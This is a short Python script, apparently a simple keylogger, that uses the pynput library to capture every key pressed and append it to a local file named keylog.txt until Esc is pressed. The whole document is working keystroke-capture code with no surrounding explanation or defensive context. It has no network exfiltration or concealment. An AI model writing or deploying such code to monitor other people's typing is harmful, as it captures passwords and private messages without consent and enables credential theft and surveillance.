from pynput import keyboard

# Function to write keystrokes to a file
def write_to_file(key):
    with open("keylog.txt", "a") as log_file:
        # Handle special keys and normal character keys
        if isinstance(key, keyboard.KeyCode):
            log_file.write(key.char)
        elif key == keyboard.Key.space:
            log_file.write(' ')
        elif key == keyboard.Key.enter:
            log_file.write('\n')
        else:
            log_file.write(f' [{key.name}] ')

# Callback function for when a key is pressed
def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error: {e}")

# Callback function for when a key is released (optional, can be omitted if not needed)
def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on pressing 'esc'
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
